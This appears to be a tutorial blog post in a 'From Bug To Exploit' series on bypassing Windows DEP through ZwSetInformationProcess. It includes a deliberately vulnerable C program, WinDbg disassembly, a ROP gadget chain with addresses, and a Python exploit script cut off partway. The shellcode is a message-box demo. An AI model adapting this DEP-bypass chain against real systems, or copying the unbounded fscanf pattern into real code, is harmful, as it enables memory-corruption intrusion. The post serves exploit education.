@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] Bypassing DEP: ZwSetInformationProcess | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learning] Bypassing DEP: ZwSetInformationProcess | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/12.png"><meta property="og:title" content="[Learning] Bypassing DEP: ZwSetInformationProcess"><meta property="og:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/12.png"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] Bypassing DEP: ZwSetInformationProcess</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-25T07:00:46.000Z" id="date"> 2026-09-25</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-28T07:48:47.020Z" id="updated"> 2026-09-28</time></div></span><br><span>Word Count: <div class="control">2.4k</div></span><br><span>Read Time: <div class="control">14 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <strong><a href="/FromBugToExploit/">From Bug To Exploit</a></strong>.</p>
+<p>In this article, I will introduce the underlying principles of bypassing DEP and demonstrate how to bypass it via <code>ZwSetInformationProcess</code>.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/8.png'><img src="/images/meme/Rio/8.png" width=250/>
+</p>
+
+<h1 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h1><p>DEP stands for <strong>Data Execution Prevention</strong>. It is a technique used to protect computers from buffer overflow attacks.</p>
+<p>It marks memory regions as non-executable, such that an attempt to execute machine code in these regions will cause an exception (<code>ACCESS_VIOLATION</code>). It relies on hardware features such as the NX bit (no-execute bit), or software emulation when hardware support is unavailable.</p>
+<p>So, how can we execute the payload on the stack? The key point is that we do not directly execute the code protected by DEP, such as the code on the stack. To do so, we need to use a technique called <strong>ROP</strong>.</p>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP stands for <strong>Return-Oriented Programming</strong>. It is a technique used to bypass DEP.</p>
+<p>We know that one of the key steps in a stack-based buffer overflow attack is to overwrite <code>EIP</code>. Normally, the address stored in <code>EIP</code> contains an instruction that allows us to jump to the stack, such as <code>jmp esp</code>.</p>
+<p>However, if we execute a small piece of code that ends with a <code>retn</code> instruction, the value in the next slot of the stack will be loaded into <code>EIP</code> as well. For example, the layout of the stack is shown below:</p>
+<p>We overwrite <code>EIP</code> with <code>0xbad00010</code>, and then the CPU executes <code>mov eax, 1</code> followed by <code>retn</code>. Since <code>retn</code> loads the next value from the stack into <code>EIP</code>, the CPU will then execute the code at <code>0xbad00020</code>, which contains <code>add eax, 2</code> followed by another <code>retn</code>. The final value of <code>eax</code> is therefore <code>3</code>.</p>
+<p>This is what people call <strong>Return-Oriented Programming (ROP)</strong>. These small pieces of code can be chained together using <code>retn</code>. Therefore, we can execute them as a chain.</p>
+<p>People call these pieces of code <strong>gadgets</strong>. They have to be located in executable memory that is not protected by DEP.</p>
+<p>Of course, in real-world practice, the situation is much more complicated, but this is the core idea of ROP. We use gadgets to execute instructions without executing code from DEP-protected memory, allowing us to bypass or disable DEP and eventually execute the final shellcode or payload.</p>
+<p>Generally, there are several methods to disable or bypass DEP:</p>
+<ol>
+<li><code>ZwSetInformationProcess</code></li>
+<li><code>SetProcessDEPPolicy</code></li>
+<li><code>VirtualProtect</code></li>
+<li><code>WriteProcessMemory</code></li>
+<li><code>VirtualAlloc &amp; memcpy</code></li>
+<li><code>HeapCreate &amp; HeapAlloc &amp; memcpy</code></li>
+</ol>
+<p>In this article, I will introduce the first method.</p>
+<h1 id="ZwSetInformationProcess"><a href="#ZwSetInformationProcess" class="headerlink" title="ZwSetInformationProcess"></a>ZwSetInformationProcess</h1><p>The API <code>ZwSetInformationProcess</code> is an undocumented function. It is defined in <code>ntdll.dll</code>.</p>
+<p>It is also worth mentioning that there is another similar function, <code>NtSetInformationProcess</code>. In user mode, these two functions are almost the same. In kernel mode, however, they are different.</p>
+<p>We don’t have to deeply understand how it works. We just need to know that this function can be used to disable DEP.</p>
+<blockquote>
+<p>Note: I wrote an article about critical processes. Some malware also uses the API <code>NtSetInformationProcess</code> to protect itself. If you are interested, you can refer to <a href="/2026/03/24/2026-3-24-CriticalProcess/">this article</a>.</p>
+</blockquote>
+<p>Run the command below in WinDbg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">x ntdll!*SetInformationProcess<br></code></pre></td></tr></table></figure>
+<p>We can see that the addresses of both <code>NtSetInformationProcess</code> and <code>ZwSetInformationProcess</code> are the same.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/1.png'><img src="/images/article/2026-9-25-DEP/1.png" width=800/>
+</p>
+
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>First, we need a vulnerable application. I wrote a simple vulnerable C program, <code>vulnerable.c</code>, to demonstrate the exploit:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vulnerable.c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_something</span><span class="hljs-params">(FILE *pfile)</span><br>&#123;<br>	<span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>	<span class="hljs-built_in">fscanf</span>(pfile, <span class="hljs-string">&quot;%s&quot;</span>, buf);<br>	<br>	<span class="hljs-comment">// do file reading and parsing below</span><br>	<span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>	<span class="hljs-type">char</span> dummy[<span class="hljs-number">1024</span>];<br>	FILE *pfile;<br>	<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vulnerable001 starts...\n&quot;</span>);<br>	<br>	<span class="hljs-keyword">if</span> (argc &gt;= <span class="hljs-number">2</span>)<br>		pfile = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>);<br>	<span class="hljs-keyword">if</span> (pfile != <span class="hljs-literal">NULL</span>)<br>		do_something(pfile);<br>		<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vulnerable001 ends...\n&quot;</span>);<br>	<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>After opening the application win <strong>WinDbg</strong>, we can disassemble it with the command below:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uf ntdll!LdrpCheckNXCompatibility<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/2.png'><img src="/images/article/2026-9-25-DEP/2.png" width=800/>
+</p>
+
+<p>The output shows the implementation of <code>ntdll!LdrpCheckNXCompatibility</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; uf ntdll!LdrpCheckNXCompatibility<br>ntdll!LdrpCheckNXCompatibility:<br>7eb4e5e9 8bff            mov     edi,edi<br>7eb4e5eb 55              push    ebp<br>7eb4e5ec 8bec            mov     ebp,esp<br>7eb4e5ee 51              push    ecx<br>7eb4e5ef 8365fc00        and     dword ptr [ebp-4],0<br>7eb4e5f3 56              push    esi<br>7eb4e5f4 ff7508          push    dword ptr [ebp+8]<br>7eb4e5f7 e887ffffff      call    ntdll!LdrpCheckSafeDiscDll (7eb4e583)<br>7eb4e5fc 3c01            cmp     al,1<br>7eb4e5fe 6a02            push    2<br>7eb4e600 5e              pop     esi<br>7eb4e601 0f84972b0200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7eb7119e)<br><br>ntdll!LdrpCheckNXCompatibility+0x1d:<br>7eb4e607 837dfc00        cmp     dword ptr [ebp-4],0<br>7eb4e60b 0f85287d0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7eb66339)<br><br>ntdll!LdrpCheckNXCompatibility+0x23:<br>7eb4e611 ff7508          push    dword ptr [ebp+8]<br>7eb4e614 e836000000      call    ntdll!LdrpCheckAppDatabase (7eb4e64f)<br>7eb4e619 84c0            test    al,al<br>7eb4e61b 0f85107d0100    jne     ntdll!LdrpCheckNXCompatibility+0x2f (7eb66331)<br><br>ntdll!LdrpCheckNXCompatibility+0x32:<br>7eb4e621 837dfc00        cmp     dword ptr [ebp-4],0<br>7eb4e625 0f850e7d0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7eb66339)<br><br>ntdll!LdrpCheckNXCompatibility+0x38:<br>7eb4e62b ff7508          push    dword ptr [ebp+8]<br>7eb4e62e e8a6000000      call    ntdll!LdrpCheckNxIncompatibleDllSection (7eb4e6d9)<br>7eb4e633 84c0            test    al,al<br>7eb4e635 0f856b2b0200    jne     ntdll!LdrpCheckNXCompatibility+0x44 (7eb711a6)<br><br>ntdll!LdrpCheckNXCompatibility+0x47:<br>7eb4e63b 837dfc00        cmp     dword ptr [ebp-4],0<br>7eb4e63f 0f85f47c0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7eb66339)<br><br>ntdll!LdrpCheckNXCompatibility+0x5c:<br>7eb4e645 5e              pop     esi<br>7eb4e646 c9              leave<br>7eb4e647 c20400          ret     4<br><br>ntdll!LdrpCheckNXCompatibility+0x2f:<br>7eb66331 8975fc          mov     dword ptr [ebp-4],esi<br>7eb66334 e9e882feff      jmp     ntdll!LdrpCheckNXCompatibility+0x32 (7eb4e621)<br><br>ntdll!LdrpCheckNXCompatibility+0x4d:<br>7eb66339 6a04            push    4<br>7eb6633b 8d45fc          lea     eax,[ebp-4]<br>7eb6633e 50              push    eax<br>7eb6633f 6a22            push    22h<br>7eb66341 6aff            push    0FFFFFFFFh<br>7eb66343 e85679fdff      call    ntdll!NtSetInformationProcess (7eb3dc9e)<br>7eb66348 e9f882feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7eb4e645)<br><br>ntdll!LdrpCheckNXCompatibility+0x1a:<br>7eb7119e 8975fc          mov     dword ptr [ebp-4],esi<br>7eb711a1 e961d4fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7eb4e607)<br><br>ntdll!LdrpCheckNXCompatibility+0x44:<br>7eb711a6 8975fc          mov     dword ptr [ebp-4],esi<br>7eb711a9 e98dd4fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x47 (7eb4e63b)<br></code></pre></td></tr></table></figure>
+<p>We can see that the instruction at <code>7eb66343</code> calls <code>ntdll!NtSetInformationProcess</code>.</p>
+<p>Let’s take a look at how we can reach this instruction.</p>
+<p>The relevant code is located at <code>ntdll!LdrpCheckNXCompatibility+0x4d</code></p>
+<p>The instructions at <code>7eb4e60b</code>, <code>7eb4e625</code> and <code>7eb4e63f</code> check whether <code>[EBP-4]</code> is zero. If it is not zero, they reirect the execution flow to <code>ntdll!LdrpCheckNXCompatibility+0x4d</code>.</p>
+<p>In particular:</p>
+<p><code>7eb4e60b</code> -&gt; <code>7eb66343</code>.</p>
+<p>So, how can we reach <code>7eb4e60b</code>, or <code>ntdll!LdrpCheckNXCompatibility+0x1d</code>?</p>
+<p>The answer is <code>ntdll!LdrpCheckNXCompatibility+0x1a</code>, located at <code>7eb711a1</code>. This instruction moves the value of <code>ESI</code> into <code>[EBP-4]</code>.</p>
+<p>Therefore, if the value at <code>[ESI]</code> is non-zero, we can use this execution path to reach <code>7eb66343</code>. Of course, <code>[EBP-4]</code> must point to writable memory. Otherwise, the operating system will raise an access violation exception when the instruction attempts to write to it.</p>
+<p>The execution flow is therefore: <code>7eb711a1</code> -&gt; <code>7eb4e60b</code> -&gt; <code>7eb66343</code>.</p>
+<p>There is another important requirement: <code>[EBP-4]</code> must be a valid writable location on the stack.</p>
+<p>After <code>ntdll!LdrpCheckNXCompatibility+0x4d</code> finishes, the execution flow eventually reaches <code>ntdll!LdrpCheckNXCompatibility+0x5c</code>.</p>
+<p>At this point, the function executes <code>leave</code> followed by <code>ret</code>. The <code>leave</code> instruction effectively performs <code>mov esp, ebp</code> followed by <code>pop ebp</code>. Therefore, <code>EBP</code> must point to a valid location on the stack.</p>
+<p>So far, we know how to reach <code>7eb711a1</code>, but how can we reach it in the first place?</p>
+<p>The instruction at <code>7eb4e5fc</code> checks whether <code>AL</code> is <code>1</code>. If it is, the execution flow reaches <code>ntdll!LdrpCheckNXCompatibility+0x1a</code>, which is located at <code>7eb711a1</code>.</p>
+<p>Therefore: <code>7eb4e5fc</code> -&gt; <code>7eb711a1</code> -&gt; <code>7eb4e60b</code> -&gt; <code>7eb66343</code></p>
+<p>In other words, we need to make <code>AL</code> equal to <code>1</code>, make <code>EBP</code> point to a valid location on the stack, and then redirect the execution flow to <code>7eb4e5fc</code>.</p>
+<p>Once <code>7eb4e5fc</code> is executed, the execution flow eventually reaches <code>7eb4e645</code> (<code>pop esi # leave # ret 4</code>). The <code>ret 4</code> instruction then redirects the execution flow to the address stored on the stack. Since DEP has already been disabled at this point, the shellcode on the stack can finally be executed.</p>
+<hr>
+<p>The next question is: how can we construct a ROP chain that satisfies all these requirements?</p>
+<p>Load <code>vulnerable.exe</code> with Immunity Debugger and run the command below:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona rop -m *<br></code></pre></td></tr></table></figure>
+<p>We can find all available gadgets in <code>rop.txt</code>.</p>
+<p>We can use the following gadgets:</p>
+<p>The first gadget allows us to modify <code>EAX</code>, while the second manipulates <code>ESP</code>. The third gadget is used to prepare the value of <code>AL</code> and adjust the stack layout.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/3.png'><img src="/images/article/2026-9-25-DEP/3.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/4.png'><img src="/images/article/2026-9-25-DEP/4.png" width=800/>
+</p>
+
+<p>Since we use <code>BYTE PTR DS:[EAX]</code>, the value of <code>[EAX]</code> has to be a valid stack in the stack. We can set a breakpoint and check the value of it when a buffer overflow occurs:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/5.png'><img src="/images/article/2026-9-25-DEP/5.png" width=800/>
+</p>
+
+<p>Check the value of <code>[EAX]</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/7.png'><img src="/images/article/2026-9-25-DEP/7.png" width=700/>
+</p>
+
+<p>The <code>Protect</code> is <code>PAGE_NOACCESS</code>. Therefore, we have to put a valid address into <code>[EAX]</code>. Otherwise, our gadgets raise exception. To do this, we can just move the value of registers into it:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/6.png'><img src="/images/article/2026-9-25-DEP/6.png" width=700/>
+</p>
+
+<p>Both the addresses in <code>ECX</code> and <code>EDX</code> are readable. Here, I chose <code>EDX</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/8.png'><img src="/images/article/2026-9-25-DEP/8.png" width=800/>
+</p>
+
+<p>The execution flow can be organized as follows:</p>
+<ol>
+<li><code>0x7eba6872</code>: <code>MOV EAX # POP EBX # RETN</code></li>
+<li>4 bytes padding for <code>POP EBX</code></li>
+<li><code>0x7eb58590</code>: <code>MOV AL,1 # POP EDI # POP ESI # POP EBP # RETN 0x10</code></li>
+<li>12 bytes (3 x 4) padding for <code>POP EDI # POP ESI # POP EBP</code></li>
+<li><code>0x7ebae093</code>: <code>PUSH ESP # XOR DL, BYTE PTR DS:[EAX] # POP ESP # RETN 0x04</code></li>
+<li>16 bytes for <code>RETN 0x04</code></li>
+<li>(Something….)</li>
+<li><code>7eb4e5fc</code></li>
+</ol>
+<p>The important part here is understanding how the stack changes throughout the chain.</p>
+<p><code>7eb4e5fc</code> eventually leads to <code>7eb4e645</code>, where the instructions <code>leave</code> and <code>ret 4</code> are executed.</p>
+<p>As shown in the disassembled code, there are four push instructions before the call to <code>NtSetInformationProcess</code> in the <code>ntdll!LdrpCheckNXCompatibility+0x4d</code> section.</p>
+<p>When a <code>push</code> instruction is executed, the stack grows toward lower addresses. In other words, <code>ESP</code> decreases by <code>4</code> bytes.</p>
+<p>In addition, when <code>leave</code> is executed, <code>ESP</code> becomes <code>EBP + 4</code>, because <code>leave</code> is effectively equivalent to <code>mov esp, ebp</code> followed by <code>pop ebp</code>.</p>
+<p>Then, <code>ret 4</code> loads the value at <code>[ESP]</code> into <code>EIP</code> and increases <code>ESP</code> by <code>8</code> bytes in total: <code>4</code> bytes for the return address and another <code>4</code> bytes for the <code>ret 4</code> adjustment.</p>
+<p>Therefore, we need to place an address containing a <code>jmp esp</code> instruction at <code>EBP + 4</code>. After DEP is disabled, the execution flow will then be redirected to the shellcode.</p>
+<p>However, if the available space is too small, <code>ESP</code> may move too far away from <code>EBP</code>, causing the data in the stack to be overwritten before <code>7eb4e645</code> is executed.</p>
+<p>Therefore, the minimum required space is <code>16</code> bytes (four <code>push</code> instructions, which move <code>ESP</code> toward lower addresses) minus <code>9</code> bytes (<code>leave</code> and <code>ret 4</code>), giving us <code>7</code> bytes. Usually, we need more space as a safety margin.</p>
+<p>Here, we use <code>0x7eb3e8b9</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/9.png'><img src="/images/article/2026-9-25-DEP/9.png" width=800/>
+</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x7eb3e8b9 :  # POP ESI # POP EDI # POP EBX # RETN    ** [ntdll.dll] **   |   &#123;PAGE_EXECUTE_READ&#125;<br></code></pre></td></tr></table></figure>
+<p>Therefore, the final execution flow can be organized as follows:</p>
+<ol>
+<li><code>0x7eba6872</code>: <code>MOV EAX # POP EBX # RETN</code></li>
+<li>4 bytes padding for <code>POP EBX</code></li>
+<li><code>0x7eb58590</code>: <code>MOV AL,1 # POP EDI # POP ESI # POP EBP  # RETN 0x10</code></li>
+<li>12 bytes (3 x 4) padding for <code>POP EDI # POP ESI # POP EBP</code></li>
+<li><code>0x7ebae093</code>: <code>PUSH ESP # XOR DL, BYTE PTR DS:[EAX] # POP ESP # RETN 0x04</code></li>
+<li>16 bytes for <code>RETN 0x10</code></li>
+<li><code>0x7eb3e8b9</code>: <code>POP ESI # POP EDI # POP EBX # RETN</code></li>
+<li>12 bytes padding</li>
+<li><code>0x7c874f13</code>: <code>jmp esp</code></li>
+<li>4 bytes padding</li>
+<li><code>\x90\x90\xeb\x18</code>: <code>jmp short 0x1a</code></li>
+<li>4 bytes padding</li>
+<li><code>0x7eb3e8b9</code>: <code>POP ESI # POP EDI # POP EBX # RETN</code></li>
+<li>12 bytes padding</li>
+<li><code>0x7eb4e5fc</code>: Call <code>LdrpCheckNXCompatibility+0x12</code></li>
+</ol>
+<p>The final ROP exploited can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit_dep.py</span><br><br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_shellcode</span>() -&gt; <span class="hljs-built_in">bytes</span>:<br>    shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;messagebox.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        shellcode += f.read()<br><br>    <span class="hljs-keyword">return</span> shellcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">140</span><br>    junk = <span class="hljs-string">b&#x27;A&#x27;</span> * offset<br><br>    <span class="hljs-comment"># adjust EAX</span><br>    eax_adjust = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7eba6872</span>)<br>    eax_adjust_padding = <span class="hljs-string">b&#x27;B&#x27;</span> * (<span class="hljs-number">4</span> * <span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># set AL to 1</span><br>    set_al = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7eb58590</span>)<br>    set_al_padding = <span class="hljs-string">b&#x27;C&#x27;</span> * (<span class="hljs-number">4</span> * <span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># adjust EBP</span><br>    ebp_adjust = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7ebae093</span>)<br>    ebp_adjust_padding = <span class="hljs-string">b&#x27;D&#x27;</span> * <span class="hljs-number">0x10</span><br><br>    <span class="hljs-comment"># adjust ESP, making it larget than EBP, for room to pivot execution flow back to the stack</span><br>    <span class="hljs-comment"># POP ESI # POP EDI # POP EBX # RETN</span><br>    esp_adjust = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7eb3e8b9</span>)<br><br>    pop1 = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7c874f13</span>)<br>    pop2 = <span class="hljs-string">b&#x27;E&#x27;</span> * <span class="hljs-number">4</span><br>    pop3 = <span class="hljs-string">b&#x27;\x90\x90\xeb\x18&#x27;</span><br>    pop4 